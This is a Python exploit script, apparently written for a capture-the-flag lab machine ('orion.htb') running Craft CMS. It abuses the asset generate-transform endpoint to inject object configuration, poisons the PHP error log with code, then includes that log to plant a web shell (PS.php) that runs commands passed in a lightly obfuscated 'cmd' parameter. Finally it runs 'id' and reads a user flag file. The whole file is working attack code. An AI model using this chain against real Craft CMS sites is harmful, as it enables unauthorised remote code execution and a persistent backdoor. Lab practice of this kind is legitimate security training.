import requests, re, time, sys

HOST = 'http://10.129.54.86'
HEADERS = {'Host': 'orion.htb'}

def send(body):
    s = requests.Session()
    r = s.get(f'{HOST}/index.php?p=admin/login', headers=HEADERS, timeout=30)
    m = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
    if not m:
        print("    [DEBUG] No CSRF token in response")
        print(f"    [DEBUG] First 500: {r.text[:500]}")
        return None
    csrf = m.group(1)
    r2 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform',
               json=body, headers={**HEADERS, 'Content-Type': 'application/json', 'X-CSRF-Token': csrf}, timeout=30)
    return r2

print("=" * 60)
print("Log Injection Exploit")
print("=" * 60)

shell_file = '/var/www/html/craft/web/PS.php'
error_log = '/var/www/html/craft/storage/logs/phperrors.log'

# PHP code that will be injected into the error log.
# When error_log is included via require(), this code runs.
# Single-quoted strings avoid PHP interpolation.
php_inject = (
    "<?php "
    "file_put_contents('" + shell_file + "', "
    "'<?php system($_GET[chr(99).chr(109).chr(100)]); ?>'); "
    "?>"
)

inject_path = '/nonexistent_dir/' + php_inject

print(f"\n[*] Step 1: Trigger error with payload in path")
print(f"    Path (first 80): {inject_path[:80]}...")

body1 = {
    'assetId': 11,
    'handle': {
        'width': 1, 'height': 1,
        'as session': {
            'class': 'craft\\behaviors\\FieldLayoutBehavior',
            '__class': 'yii\\rbac\\PhpManager',
            '__construct()': [{'itemFile': inject_path}]
        }
    }
}
r1 = send(body1)
print(f"    Response: {r1.status_code if r1 else 'None'}")
if r1:
    # Check if the error message with our payload is in the response
    text = r1.text
    for kw in ['file_put_contents', '<?php', inject_path[:40]]:
        if kw in text:
            idx = text.index(kw)
            print(f"    Found '{kw}' at {idx}")
            print(f"    Context: {text[max(0,idx-30):idx+80]}")

print(f"\n[*] Step 2: Wait for log write, then include error_log")
time.sleep(3)

body2 = {
    'assetId': 11,
    'handle': {
        'width': 1, 'height': 1,
        'as session': {
            'class': 'craft\\behaviors\\FieldLayoutBehavior',
            '__class': 'yii\\rbac\\PhpManager',
            '__construct()': [{'itemFile': error_log}]
        }
    }
}
r2 = send(body2)
print(f"    Response: {r2.status_code if r2 else 'None'}")
if r2:
    text = r2.text
    print(f"    Body: {len(text)} bytes")
    # Check for any PHP errors from the error_log include
    for kw in ['<title>500', '<title>400', 'syntax error', 'unexpected', 'PHP Parse']:
        if kw in text:
            print(f"    Error in response: '{kw}'")
    # Check if our injection appears in the response
    for kw in ['file_put_contents', 'PS.php', shell_file[:40], 'nonexistent']:
        if kw in text:
            idx = text.index(kw)
            print(f"    Found '{kw}' in response at {idx}: {text[idx:idx+100]}")

print(f"\n[*] Step 3: Check for shell")
time.sleep(2)
r3 = requests.get(f'{HOST}/PS.php?cmd=id', headers=HEADERS, timeout=10)
print(f"    Status: {r3.status_code}")
if r3.status_code == 200:
    print(f"[+] SHELL FOUND!")
    print(f"    Output: {r3.text[:1000]}")
    # Try to read flags
    r4 = requests.get(f'{HOST}/PS.php?cmd=cat /home/adam/user.txt', headers=HEADERS, timeout=10)
    if r4.status_code == 200:
        print(f"[+] USER FLAG: {r4.text[:200]}")
    sys.exit(0)
else:
    print(f"    Body: {r3.text[:200]}")
    print("[-] Shell not found")
    sys.exit(1)
